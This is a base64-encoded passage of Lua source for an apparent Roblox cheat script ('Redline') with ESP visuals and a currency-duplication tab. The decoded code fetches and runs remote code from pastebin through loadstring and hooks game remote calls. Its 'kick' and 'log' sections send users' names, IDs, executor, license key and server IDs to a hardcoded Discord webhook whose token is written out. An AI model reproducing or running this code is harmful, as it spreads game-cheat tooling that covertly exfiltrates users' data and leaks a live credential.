ayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgIENvbmZpZy5FU1AuRHJhd2luZy5IZWFsdGhiYXIuTGVycCA9IHN0YXRlCiAgICAgICAgUmVmcmVzaEFsbEVsZW1lbnRzKCkKICAgIGVuZH0pCgogICAgUGxheWVyVmlzdWFsc1NldHRpbmdzU2VjdGlvbjp0b2dnbGUoe25hbWUgPSAiR3JhZGllbnQgSGVhbHRoIEJhciIsIGZsYWcgPSAiVmlzdWFsc19IZWFsdGhCYXJHcmFkaWVudCIsIGRlZmF1bHQgPSB0cnVlLCB0eXBlID0gInRvZ2dsZSIsIGNhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgQ29uZmlnLkVTUC5EcmF3aW5nLkhlYWx0aGJhci5HcmFkaWVudCA9IHN0YXRlCiAgICAgICAgUmVmcmVzaEFsbEVsZW1lbnRzKCkKICAgIGVuZH0pCgogICAgUGxheWVyVmlzdWFsc1NldHRpbmdzU2VjdGlvbjp0b2dnbGUoe25hbWUgPSAiVGhlcm1hbCBDaGFtcyIsIGZsYWcgPSAiVmlzdWFsc19DaGFtc1RoZXJtYWwiLCBkZWZhdWx0ID0gZmFsc2UsIHR5cGUgPSAidG9nZ2xlIiwgc2VwZXJhdG9yID0gdHJ1ZSwgY2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICBDb25maWcuRVNQLkRyYXdpbmcuQ2hhbXMuVGhlcm1hbCA9IHN0YXRlCiAgICAgICAgUmVmcmVzaEFsbEVsZW1lbnRzKCkKICAgIGVuZH0pCgogICAgUGxheWVyVmlzdWFsc1NldHRpbmdzU2VjdGlvbjpkcm9wZG93bih7bmFtZSA9ICJUZXh0IEZvbnQiLCBmbGFnID0gIlZpc3VhbHNfVGV4dEZvbnQiLCB3aWR0aCA9IDEzMCwKICAgICAgICBpdGVtcyA9IHsKICAgICAgICAgICAgIkFyY2FkZSIsCiAgICAgICAgICAgICJCdWlsZGVyU2FucyIsCiAgICAgICAgICAgICJDb2RlIiwKICAgICAgICAgICAgIlBpeGVsIiwKICAgICAgICAgICAgIlBsZXgiLAogICAgICAgICAgICAiRmFudGFzeSIsCiAgICAgICAgICAgICJGcmVkb2thT25lIiwKICAgICAgICAgICAgIkdvdGhhbSIsCiAgICAgICAgICAgICJHb3RoYW1CbGFjayIsCiAgICAgICAgICAgICJNaW5lY3JhZnRpYSIsCiAgICAgICAgICAgICJKdXJhIiwKICAgICAgICAgICAgIlJvYm90byIsCiAgICAgICAgICAgICJSb2JvdG9Nb25vIiwKICAgICAgICAgICAgIlNvdXJjZVNhbnMiLAogICAgICAgICAgICAiVmVyZGFuYSIKICAgICAgICB9LCBtdWx0aSA9IGZhbHNlLCBkZWZhdWx0ID0gIlBsZXgiLCBjYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgICAgICBDb25maWcuRVNQLkZvbnQgPSAoc3RhdGUgPT0gIlBpeGVsIiBvciBzdGF0ZSA9PSAiUGxleCIgb3Igc3RhdGUgPT0gIk1pbmVjcmFmdGlhIiBvciBzdGF0ZSA9PSAiVmVyZGFuYSIpIGFuZCBGb250c1tzdGF0ZV0gb3IgRW51bS5Gb250W3N0YXRlXQogICAgICAgICAgICBSZWZyZXNoQWxsRWxlbWVudHMoKQogICAgICAgIGVuZAogICAgfSkKCiAgICBQbGF5ZXJWaXN1YWxzU2V0dGluZ3NTZWN0aW9uOnNsaWRlcih7bmFtZSA9ICJUZXh0IFNpemUiLCBmbGFnID0gIlRleHRTaXplX1Zpc3VhbHMiLCBtaW4gPSAxMCwgbWF4ID0gMTgsIGRlZmF1bHQgPSAxMiwgY2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICBDb25maWcuRVNQLkZvbnRTaXplID0gc3RhdGUKICAgICAgICBSZWZyZXNoQWxsRWxlbWVudHMoKQogICAgZW5kfSkKCiAgICBQbGF5ZXJWaXN1YWxzU2V0dGluZ3NTZWN0aW9uOnNsaWRlcih7bmFtZSA9ICJNYXggUmVuZGVyIERpc3RhbmNlIiwgZmxhZyA9ICJNYXhSZW5kZXJEaXN0YW5jZV9WaXN1YWxzIiwgbWluID0gMTAsIG1heCA9IDUwMDAsIGRlZmF1bHQgPSAxMDAwLCBzdWZmaXggPSAic3QiLCBjYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgIENvbmZpZy5FU1AuTWF4RGlzdGFuY2UgPSBzdGF0ZQogICAgZW5kfSkKZW5kCgpsaWJyYXJ5OmluaXRfY29uZmlnKHdpbmRvdykKCmlmIEdhbWVfTmFtZSA9PSAiU291dGggQnJvbngiIHRoZW4KICAgIGxvY2FsIER1cGVUYWIgPSB3aW5kb3c6dGFiKHtuYW1lID0gIkR1cGxpY2F0aW9uIiwgdGFicyA9IHsiR2VuZXJhbCJ9LCBpY29uID0gR2V0SW1hZ2UoIkNhc2gucG5nIil9KSBkbwogICAgICAgIGxvY2FsIER1cGVDb2x1bW4gPSBEdXBlVGFiOmNvbHVtbih7fSkKICAgICAgICBsb2NhbCBEdXBsaWNhdGlvblNlY3Rpb24gPSBEdXBlQ29sdW1uOnNlY3Rpb24oe25hbWUgPSAiQXV0b21hdGljIER1cGxpY2F0aW9uIiwgc2lkZSA9ICJsZWZ0Iiwgc2l6ZSA9IDAuNiwgaWNvbiA9IEdldEltYWdlKCJXcmVuY2gucG5nIil9KQoKICAgICAgICBEdXBsaWNhdGlvblNlY3Rpb246dGV4dGJveCh7bmFtZSA9ICJTZWxlY3RlZCBQbGF5ZXIncyBOYW1lIiwgY2FsbGJhY2sgPSBmdW5jdGlvbih0ZXh0KQogICAgICAgICAgICBsb2NhbCBuYW1lID0gdGV4dDsKCiAgICAgICAgICAgIGZvciBpLHYgaW4gU2VydmljZXMuUGxheWVyczpHZXRQbGF5ZXJzKCkgZG8KICAgICAgICAgICAgICAgIGlmIHZ+PVNlcnZpY2VzLlBsYXllcnMuTG9jYWxQbGF5ZXIgdGhlbgogICAgICAgICAgICAgICAgICAgIGlmIHN0cmluZy5maW5kKHYuTmFtZTpsb3dlcigpLCB0ZXh0Omxvd2VyKCkpIG9yIHN0cmluZy5tYXRjaCh2Lk5hbWU6bG93ZXIoKSwgdGV4dDpsb3dlcigpKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIG5hbWUgPSB2Lk5hbWU7CiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCgogICAgICAgICAgICB3cml0ZWZpbGUoIlNvdXRoQnJvbnhVc2VybmFtZVJlYWxHYW1lLnR4dCIsIG5hbWUpCiAgICAgICAgZW5kfSkKCiAgICAgICAgRHVwbGljYXRpb25TZWN0aW9uOnRleHRib3goe25hbWUgPSAiQW1vdW50IFRvIFNlbmQgKE1heCBJcyAkMjAwMDApIiwgY2FsbGJhY2sgPSBmdW5jdGlvbih0ZXh0KQogICAgICAgICAgICB3cml0ZWZpbGUoIlNvdXRoQnJvbnhBbW91bnRSZWFsR2FtZS50eHQiLCB0ZXh0KQogICAgICAgIGVuZH0pCgogICAgICAgIER1cGxpY2F0aW9uU2VjdGlvbjpidXR0b24oe25hbWUgPSAiU3RhcnQgQXV0b21hdGVkIER1cGluZyIsIGNhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgICAgICBxdWV1ZV9vbl90ZWxlcG9ydCgibG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoJ2h0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy9OeGNaZkc2dScpKSgpIikKCiAgICAgICAgICAgIFNlcnZpY2VzLlRlbGVwb3J0U2VydmljZTpUZWxlcG9ydFRvUGxhY2VJbnN0YW5jZShnYW1lLlBsYWNlSWQsIGdhbWUuSm9iSWQpCiAgICAgICAgZW5kfSkKCiAgICAgICAgRHVwbGljYXRpb25TZWN0aW9uOmxhYmVsKHtuYW1lID0gIlBsZWFzZSByZWFkISIsIHdyYXBwZWQgPSB0cnVlLCBpbmZvID0gIllvdSB3aWxsIG5lZWQgJDIsMDAwIGV4dHJhIG9udG9wIG9mIHdoYXQgeW91ciBzZW5kaW5nISBmb3IgZXhhbXBsZSBpZiB5b3Ugd2FudCB0byBzZW5kICQyMCwwMDAgeW91IHdpbGwgbmVlZCAkMjIsMDAwISJ9KQogICAgZW5kCmVuZAoKaWYgaG9va2Z1bmN0aW9uIGFuZCBub3QgU29sYXJhIGFuZCBMUEhfT0JGVVNDQVRFRCBhbmQgR2FtZV9OYW1lID09ICJTb3V0aCBCcm9ueCIgdGhlbgogICAgbG9jYWwgX0ZpcmVTZXJ2ZXI7CiAgICBsb2NhbCBfRnVuY3Rpb247CgogICAgX0ZpcmVTZXJ2ZXIgPSBob29rZnVuY3Rpb24oSW5zdGFuY2UubmV3KCJSZW1vdGVFdmVudCIsIG5pbCkuRmlyZVNlcnZlciwgZnVuY3Rpb24oc2VsZiwgLi4uKQogICAgICAgIGxvY2FsIEFyZ3VtZW50cyA9IHsuLi59CgogICAgICAgIGlmIHRvc3RyaW5nKHNlbGYpID09ICJQdXJjaGFzZUl0ZW0iIGFuZCBBcmd1bWVudHNbMl0gPT0gJ1Nob2VzJyBhbmQgQXJndW1lbnRzWzNdID09ICdZWiBTbGlkZXMnIGFuZCBBcmd1bWVudHNbNF0gPT0gJ1wyNTUnIHRoZW4KICAgICAgICAgICAgbG9jYWwgZiwgcyA9IGRlYnVnLmdldGluZm8oMiwgImZzIikKICAgICAgICAgICAgaWYgbm90IF9GdW5jdGlvbiB0aGVuCiAgICAgICAgICAgICAgICBfRnVuY3Rpb24gPSBmLmZ1bmMKICAgICAgICAgICAgZW5kCgogICAgICAgICAgICBpZiBfRnVuY3Rpb24gfj0gZi5mdW5jIHRoZW4KICAgICAgICAgICAgICAgIHdoaWxlIHRydWUgZG8gZW5kCiAgICAgICAgICAgICAgICByZXR1cm4KICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCgogICAgICAgIHJldHVybiBfRmlyZVNlcnZlcihzZWxmLCAuLi4pCiAgICBlbmQpCmVuZAplbmQKZW5kCgotLWtpY2sKbG9jYWwgcGFzdGVVUkwgPSAiaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3LzhneWMyZXV4Igpsb2NhbCBXRUJIT09LICA9ICJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xNDM0NTgwMzkzMzk0MzA3MTczL3pRRWNsTm9fdm0zV093ZmhKdHR1Y19lbzZOUHlHZDgwbG1saTdOX0pxZ2FHem1HYkhWd2VNdFFyUG1hM0NQSmdUSFhKIgogCmxvY2FsIFBsYXllcnMgPSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKQpsb2NhbCBIdHRwU2VydmljZSA9IGdhbWU6R2V0U2VydmljZSgiSHR0cFNlcnZpY2UiKQpsb2NhbCBMb2NhbFBsYXllciA9IFBsYXllcnMuTG9jYWxQbGF5ZXIKIApsb2NhbCBVU0VSX1JBVEVfTElNSVQgPSAzMApsb2NhbCBsYXN0V2ViaG9va1NlbnQgPSB7fQpsb2NhbCBraWNrTGlzdCA9IHt9CmxvY2FsIGJsYWNrbGlzdCA9IHsgWyIxIl0gPSB0cnVlIH0KIApsb2NhbCBmdW5jdGlvbiBHZXRVUkwodXJsKQogICAgbG9jYWwgb2ssIHJlc3VsdCA9IHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICBpZiBzeW4gYW5kIHN5bi5yZXF1ZXN0IHRoZW4KICAgICAgICAgICAgcmV0dXJuIHN5bi5yZXF1ZXN0KHtVcmwgPSB1cmwsIE1ldGhvZCA9ICJHRVQifSkuQm9keQogICAgICAgIGVsc2VpZiBodHRwX3JlcXVlc3QgdGhlbgogICAgICAgICAgICByZXR1cm4gaHR0cF9yZXF1ZXN0KHtVcmwgPSB1cmwsIE1ldGhvZCA9ICJHRVQifSkuQm9keQogICAgICAgIGVsc2VpZiByZXF1ZXN0IHRoZW4KICAgICAgICAgICAgcmV0dXJuIHJlcXVlc3Qoe1VybCA9IHVybCwgTWV0aG9kID0gIkdFVCJ9KS5Cb2R5CiAgICAgICAgZWxzZQogICAgICAgICAgICByZXR1cm4gZ2FtZTpIdHRwR2V0KHVybCkKICAgICAgICBlbmQKICAgIGVuZCkKICAgIHJldHVybiBvayBhbmQgcmVzdWx0IG9yIG5pbAplbmQKIApsb2NhbCBmdW5jdGlvbiBkZXRlY3RFeGVjdXRvcigpCiAgICBpZiBzeW4gdGhlbiByZXR1cm4gIlN5bmFwc2UgWCIKICAgIGVsc2VpZiBpc19zaXJodXJ0X2Nsb3N1cmUgdGhlbiByZXR1cm4gIlNpcmh1cnQiCiAgICBlbHNlaWYgS1JOTF9MT0FERUQgdGhlbiByZXR1cm4gIktSTkwiCiAgICBlbHNlaWYgaWRlbnRpZnlleGVjdXRvciB0aGVuCiAgICAgICAgbG9jYWwgb2ssIG5hbWUgPSBwY2FsbChpZGVudGlmeWV4ZWN1dG9yKQogICAgICAgIGlmIG9rIHRoZW4gcmV0dXJuIG5hbWUgZW5kCiAgICBlbmQKICAgIHJldHVybiAiVW5rbm93biIKZW5kCiAKbG9jYWwgZnVuY3Rpb24gc2VuZFdlYmhvb2soZGF0YSkKICAgIGxvY2FsIGJvZHkgPSBIdHRwU2VydmljZTpKU09ORW5jb2RlKGRhdGEpCiAKICAgIGxvY2FsIG1ldGhvZHMgPSB7CiAgICAgICAgZnVuY3Rpb24oKQogICAgICAgICAgICByZXR1cm4gc3luIGFuZCBzeW4ucmVxdWVzdCBhbmQgc3luLnJlcXVlc3QoewogICAgICAgICAgICAgICAgVXJsID0gV0VCSE9PSywKICAgICAgICAgICAgICAgIE1ldGhvZCA9ICJQT1NUIiwKICAgICAgICAgICAgICAgIEhlYWRlcnMgPSB7WyJDb250ZW50LVR5cGUiXSA9ICJhcHBsaWNhdGlvbi9qc29uIn0sCiAgICAgICAgICAgICAgICBCb2R5ID0gYm9keQogICAgICAgICAgICB9KQogICAgICAgIGVuZCwKIAogICAgICAgIGZ1bmN0aW9uKCkKICAgICAgICAgICAgcmV0dXJuIGh0dHBfcmVxdWVzdCBhbmQgaHR0cF9yZXF1ZXN0KHsKICAgICAgICAgICAgICAgIFVybCA9IFdFQkhPT0ssCiAgICAgICAgICAgICAgICBNZXRob2QgPSAiUE9TVCIsCiAgICAgICAgICAgICAgICBIZWFkZXJzID0ge1siQ29udGVudC1UeXBlIl09ImFwcGxpY2F0aW9uL2pzb24ifSwKICAgICAgICAgICAgICAgIEJvZHkgPSBib2R5CiAgICAgICAgICAgIH0pCiAgICAgICAgZW5kLAogCiAgICAgICAgZnVuY3Rpb24oKQogICAgICAgICAgICByZXR1cm4gcmVxdWVzdCBhbmQgcmVxdWVzdCh7CiAgICAgICAgICAgICAgICBVcmwgPSBXRUJIT09LLAogICAgICAgICAgICAgICAgTWV0aG9kID0gIlBPU1QiLAogICAgICAgICAgICAgICAgSGVhZGVycyA9IHtbIkNvbnRlbnQtVHlwZSJdPSJhcHBsaWNhdGlvbi9qc29uIn0sCiAgICAgICAgICAgICAgICBCb2R5ID0gYm9keQogICAgICAgICAgICB9KQogICAgICAgIGVuZAogICAgfQogCiAgICBmb3IgXywgZm4gaW4gaXBhaXJzKG1ldGhvZHMpIGRvCiAgICAgICAgbG9jYWwgb2ssIHJlcyA9IHBjYWxsKGZuKQogICAgICAgIGlmIG9rIGFuZCByZXMgdGhlbiByZXR1cm4gdHJ1ZSBlbmQKICAgIGVuZAogCiAgICB3YXJuKCJubyBzZW5kIikKICAgIHJldHVybiBmYWxzZQplbmQKIApsb2NhbCBmdW5jdGlvbiB1cGRhdGVLaWNrTGlzdCgpCiAgICBsb2NhbCBkYXRhID0gR2V0VVJMKHBhc3RlVVJMKQogICAgaWYgbm90IGRhdGEgdGhlbiByZXR1cm4gd2Fybigibm8gdXBkYXRlIikgZW5kCiAKICAgIGxvY2FsIG9rLCBkZWNvZGVkID0gcGNhbGwoZnVuY3Rpb24oKQogICAgICAgIHJldHVybiBIdHRwU2VydmljZTpKU09ORGVjb2RlKGRhdGEpCiAgICBlbmQpCiAKICAgIGlmIG9rIGFuZCB0eXBlb2YoZGVjb2RlZCkgPT0gInRhYmxlIiB0aGVuCiAgICAgICAga2lja0xpc3QgPSBkZWNvZGVkCiAgICAgICAgcHJpbnQoInVwZGF0ZSIpCiAgICBlbHNlCiAgICAgICAgd2FybigiZGVjb2RlIGVycm9yIikKICAgIGVuZAplbmQKIApsb2NhbCBmdW5jdGlvbiBjaGVja1BsYXllcnMoKQogICAgZm9yIF8sIHBsciBpbiBpcGFpcnMoUGxheWVyczpHZXRQbGF5ZXJzKCkpIGRvCiAKICAgICAgICBpZiBibGFja2xpc3RbcGxyLk5hbWVdIHRoZW4KICAgICAgICAgICAgcHJpbnQoImFldGhyYSBpcyBteSBkYWRkeSIsIHBsci5OYW1lKQogICAgICAgICAgICBjb250aW51ZQogICAgICAgIGVuZAogCiAgICAgICAgbG9jYWwgcmVhc29uID0ga2lja0xpc3RbcGxyLk5hbWVdCiAKICAgICAgICBpZiByZWFzb24gdGhlbgogICAgICAgICAgICBsb2NhbCBub3cgPSB0aWNrKCkKICAgICAgICAgICAgaWYgbm90IGxhc3RXZWJob29rU2VudFtwbHIuTmFtZV0gb3Igbm93IC0gbGFzdFdlYmhvb2tTZW50W3Bsci5OYW1lXSA+PSBVU0VSX1JBVEVfTElNSVQgdGhlbgogICAgICAgICAgICAgICAgbGFzdFdlYmhvb2tTZW50W3Bsci5OYW1lXSA9IG5vdwogCmxvY2FsIGZ1bmN0aW9uIEdldEF2YXRhclVSTCh1c2VySWQpCiAgICBsb2NhbCB1cmwgPSAiaHR0cHM6Ly90aHVtYm5haWxzLnJvYmxveC5jb20vdjEvdXNlcnMvYXZhdGFyLWhlYWRzaG90P3VzZXJJZHM9Ii4udXNlcklkLi4iJnNpemU9NDIweDQyMCZmb3JtYXQ9UG5nJmlzQ2lyY3VsYXI9ZmFsc2UiCiAgICBsb2NhbCByZXNwb25zZSA9IEdldFVSTCh1cmwpCiAgICBpZiBub3QgcmVzcG9uc2UgdGhlbiByZXR1cm4gbmlsIGVuZAogCiAgICBsb2NhbCBvaywgZGVjb2RlZCA9IHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICByZXR1cm4gSHR0cFNlcnZpY2U6SlNPTkRlY29kZShyZXNwb25zZSkKICAgIGVuZCkKIAogICAgaWYgb2sgYW5kIGRlY29kZWQgYW5kIGRlY29kZWQuZGF0YSBhbmQgZGVjb2RlZC5kYXRhWzFdIGFuZCBkZWNvZGVkLmRhdGFbMV0uaW1hZ2VVcmwgdGhlbgogICAgICAgIHJldHVybiBkZWNvZGVkLmRhdGFbMV0uaW1hZ2VVcmwKICAgIGVuZAogCiAgICByZXR1cm4gbmlsCmVuZAogCiAgICAgICAgICAgICAgICBsb2NhbCBkYXRhID0gewogICAgICAgICAgICAgICAgICAgIGVtYmVkcyA9IHt7CiAgICAgICAgICAgICAgICAgICAgICAgIHRpdGxlID0gIvCfmqggUGxheWVyIEtpY2tlZCIsCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbG9yID0gMTU3MjQ1MjcsCiAgICAgICAgICAgICAgICAgICAgICAgIHRodW1ibmFpbCA9IHsgdXJsID0gR2V0QXZhdGFyVVJMKHBsci5Vc2VySWQpIG9yICIiIH0sCiAgICAgICAgICAgICAgICAgICAgICAgIGZpZWxkcyA9IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsgbmFtZSA9ICJQbGF5ZXIiLCB2YWx1ZSA9IHBsci5OYW1lLCBpbmxpbmUgPSB0cnVlIH0sCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7IG5hbWUgPSAiVXNlcklkIiwgdmFsdWUgPSB0b3N0cmluZyhwbHIuVXNlcklkKSwgaW5saW5lID0gdHJ1ZSB9LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgeyBuYW1lID0gIkRpc3BsYXkiLCB2YWx1ZSA9IHBsci5EaXNwbGF5TmFtZSwgaW5saW5lID0gdHJ1ZSB9LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgeyBuYW1lID0gIlJlYXNvbiIsIHZhbHVlID0gcmVhc29uLCBpbmxpbmUgPSBmYWxzZSB9LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgeyBuYW1lID0gIkV4ZWN1dG9yIiwgdmFsdWUgPSBkZXRlY3RFeGVjdXRvcigpLCBpbmxpbmUgPSB0cnVlIH0sCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7IG5hbWUgPSAiU2VydmVyIEpvYklkIiwgdmFsdWUgPSBnYW1lLkpvYklkLCBpbmxpbmUgPSBmYWxzZSB9LAogICAgICAgICAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgICAgICAgICBmb290ZXIgPSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0ZXh0ID0gIlJlZGxpbmUgS2ljayBTeXN0ZW0iCiAgICAgICAgICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICAgICAgICAgIHRpbWVzdGFtcCA9IERhdGVUaW1lLm5vdygpOlRvSXNvRGF0ZSgpCiAgICAgICAgICAgICAgICAgICAgfX0KICAgICAgICAgICAgICAgIH0KIAogICAgICAgICAgICAgICAgc2VuZFdlYmhvb2soZGF0YSkKICAgICAgICAgICAgZW5kCiAKICAgICAgICAgICAgaWYgcGxyID09IExvY2FsUGxheWVyIHRoZW4KICAgICAgICAgICAgICAgIExvY2FsUGxheWVyOktpY2socmVhc29uKQogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICBwcmludCgiZm91bmQiLCBwbHIuTmFtZSkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKZW5kCiAKdXBkYXRlS2lja0xpc3QoKQpjaGVja1BsYXllcnMoKQogCnRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgd2hpbGUgdGFzay53YWl0KDEwKSBkbwogICAgICAgIHVwZGF0ZUtpY2tMaXN0KCkKICAgICAgICBjaGVja1BsYXllcnMoKQogICAgZW5kCmVuZCkKIAotLSBsb2cKbG9jYWwgV0VCSE9PSyA9ICJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xNDM0NTgwMzkzMzk0MzA3MTczL3pRRWNsTm9fdm0zV093ZmhKdHR1Y19lbzZOUHlHZDgwbG1saTdOX0pxZ2FHem1HYkhWd2VNdFFyUG1hM0NQSmdUSFhKIgpsb2NhbCBLRVlfVVJMID0gImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS94ZG9tZXN0b3MxLWFydC80MTQxNDE0MTQxNDE0MTQxNDE0MS9yZWZzL2hlYWRzL21haW4vNDE0MTQxNDE0MTQxNDE0MTQxNDEvNDE0MTQxNDE0MTQxNDE0MTQxNDEtbWFpbi8xMjMxMjNiMWozJUM0JUIxYjEyM2piMSVDNCVCMWJqMy85NDk4OTg5NDIxNDQ0NC8xMjNiMjEzYjIxM2IyMTNiLmpzb24iCgpsb2NhbCBIdHRwU2VydmljZSA9IGdhbWU6R2V0U2VydmljZSgiSHR0cFNlcnZpY2UiKQpsb2NhbCBQbGF5ZXJzID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikKbG9jYWwgTWFya2V0ID0gZ2FtZTpHZXRTZXJ2aWNlKCJNYXJrZXRwbGFjZVNlcnZpY2UiKQoKbG9jYWwgUGxheWVyID0gUGxheWVycy5Mb2NhbFBsYXllcgpsb2NhbCB1c2VybmFtZSA9IFBsYXllci5OYW1lCmxvY2FsIGRpc3BsYXlOYW1lID0gUGxheWVyLkRpc3BsYXlOYW1lCmxvY2FsIHVzZXJpZCA9IFBsYXllci5Vc2VySWQKbG9jYWwgam9iSWQgPSBnYW1lLkpvYklkIH49ICIiIGFuZCBnYW1lLkpvYklkIG9yICJTdHVkaW8gLyBQcml2YXRlIgoKbG9jYWwgYXZhdGFyID0gImh0dHBzOi8vd3d3LnJvYmxveC5jb20vaGVhZHNob3QtdGh1bWJuYWlsL2ltYWdlP3VzZXJJZD0iCiAgICAuLiB1c2VyaWQgLi4gIiZ3aWR0aD00MjAmaGVpZ2h0PTQyMCZmb3JtYXQ9cG5nIgoKbG9jYWwgZXhlY3V0b3IgPSAoaWRlbnRpZnlleGVjdXRvciBvciBnZXRleGVjdXRvcm5hbWUgb3IgZnVuY3Rpb24oKQogICAgcmV0dXJuICJVbmtub3duIgplbmQpKCkKCmxvY2FsIGdhbWVOYW1lID0gIlVua25vd24iCnBjYWxsKGZ1bmN0aW9uKCkKICAgIGdhbWVOYW1lID0gTWFya2V0OkdldFByb2R1Y3RJbmZvKGdhbWUuUGxhY2VJZCkuTmFtZQplbmQpCgoKbG9jYWwga2V5ID0gIk5vdCBGb3VuZCIKdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICBsb2NhbCBzdWNjZXNzLCByYXcgPSBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgcmV0dXJuIGdhbWU6SHR0cEdldChLRVlfVVJMLCB0cnVlKQogICAgZW5kKQogICAgaWYgc3VjY2VzcyBhbmQgcmF3IH49ICIiIHRoZW4KICAgICAgICBsb2NhbCB0YmwgPSBIdHRwU2VydmljZTpKU09ORGVjb2RlKHJhdykKICAgICAgICBpZiB0eXBlb2YodGJsKSA9PSAidGFibGUiIHRoZW4KICAgICAgICAgICAgZm9yIGssIHYgaW4gcGFpcnModGJsKSBkbwogICAgICAgICAgICAgICAgaWYgdG9zdHJpbmcodikgPT0gdXNlcm5hbWUgdGhlbgogICAgICAgICAgICAgICAgICAgIGtleSA9IHRvc3RyaW5nKGspCiAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAplbmQpCgp0YXNrLndhaXQoNCkKCmxvY2FsIHBheWxvYWQgPSBIdHRwU2VydmljZTpKU09ORW5jb2RlKHsKICAgIHVzZXJuYW1lID0gIlJlZGxpbmUgTG9nZ2VyIiwKICAgIGF2YXRhcl91cmwgPSBhdmF0YXIsIAogICAgZW1iZWRzID0ge3sKICAgICAgICB0aXRsZSA9ICLwn5qAIFNjcmlwdCBFeGVjdXRlZCIsCiAgICAgICAgZGVzY3JpcHRpb24gPSAiKipSZWRsaW5lKiogU2NyaXB0IEV4ZWN1dGVkIiwKICAgICAgICBjb2xvciA9IGtleSB+PSAiTm90IEZvdW5kIiBhbmQgMHgyRUNDNzEgb3IgMHhFNzRDM0MsCgogICAgICAgIGF1dGhvciA9IHsKICAgICAgICAgICAgbmFtZSA9IHVzZXJuYW1lIC4uICIgKCIgLi4gZGlzcGxheU5hbWUgLi4gIikiLAogICAgICAgICAgICBpY29uX3VybCA9IGF2YXRhcgogICAgICAgIH0sCgogICAgICAgIHRodW1ibmFpbCA9IHsKICAgICAgICAgICAgdXJsID0gYXZhdGFyCiAgICAgICAgfSwKCiAgICAgICAgZmllbGRzID0gewogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBuYW1lID0gIlVzZXIiLAogICAgICAgICAgICAgICAgdmFsdWUgPSAiKioiIC4uIHVzZXJuYW1lIC4uICIqKlxuYCIgLi4gdXNlcmlkIC4uICJgIiwKICAgICAgICAgICAgICAgIGlubGluZSA9IHRydWUKICAgICAgICAgICAgfSwKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgbmFtZSA9ICJFeGVjdXRvciIsCiAgICAgICAgICAgICAgICB2YWx1ZSA9IGV4ZWN1dG9yLAogICAgICAgICAgICAgICAgaW5saW5lID0gdHJ1ZQogICAgICAgICAgICB9LAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBuYW1lID0gIktleSBTdGF0dXMiLAogICAgICAgICAgICAgICAgdmFsdWUgPSBrZXkgfj0gIk5vdCBGb3VuZCIgYW5kICLinIUgVmFsaWQiIG9yICLinYwgSW52YWxpZCAvIE5vbmUiLAogICAgICAgICAgICAgICAgaW5saW5lID0gdHJ1ZQogICAgICAgICAgICB9LAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBuYW1lID0gIktleSIsCiAgICAgICAgICAgICAgICB2YWx1ZSA9ICJgYGAiIC4uIGtleSAuLiAiYGBgIiwKICAgICAgICAgICAgICAgIGlubGluZSA9IGZhbHNlCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIG5hbWUgPSAiR2FtZSIsCiAgICAgICAgICAgICAgICB2YWx1ZSA9IGdhbWVOYW1lLAogICAgICAgICAgICAgICAgaW5saW5lID0gZmFsc2UKICAgICAgICAgICAgfSwKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgbmFtZSA9ICJQbGFjZSBJRCIsCiAgICAgICAgICAgICAgICB2YWx1ZSA9ICJgIiAuLiBnYW1lLlBsYWNlSWQgLi4gImAiLAogICAgICAgICAgICAgICAgaW5saW5lID0gdHJ1ZQogICAgICAgICAgICB9LAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBuYW1lID0gIkpvYiBJRCIsCiAgICAgICAgICAgICAgICB2YWx1ZSA9ICJgYGAiIC4uIGpvYklkIC4uICJgYGAiLAogICAgICAgICAgICAgICAgaW5saW5lID0gZmFsc2UKICAgICAgICAgICAgfQogICAgICAgIH0sCgogICAgICAgIGZvb3RlciA9IHsKICAgICAgICAgICAgdGV4dCA9ICJSZWRsaW5lIFNlY3VyaXR5IOKAoiBleGVjdXRlIGxvZyIsCiAgICAgICAgICAgIGljb25fdXJ